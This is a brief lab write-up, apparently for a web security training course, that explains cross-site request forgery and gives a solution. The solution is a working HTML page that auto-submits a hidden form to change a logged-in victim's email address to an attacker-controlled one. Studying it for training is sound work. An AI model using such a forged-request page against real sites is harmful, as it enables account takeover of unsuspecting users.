1. CSRF vulnerability with no defenses</a>

Cross-site request forgery - we trick a user into making a request to a server
that alters the state for their identity. In the case of this lab, CSRF is
enabled by the fact that the target web app API doesn't require any further
authentication beyond the user's session cookie. The parameter change email
addresses is known by the attacker, so a POST request can be forged.

We host a server that will respond with malicious HTML from a /GET request. The
exploit server will forge a POST request to the target web app, changing the
email address of the user currently logged in - this occurs because the browser
will reuse cookies for the target domain.

Solution:

```html
<html>
  <body>
    <form
      action="https://1.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <input
        type="hidden"
        name="email"
        value="pwned&#64;evil&#45;user&#46;net"
      />
    </form>
    <script>
      history.pushState("", "", "/")
      document.forms[0].submit()
    </script>
  </body>
</html>
```
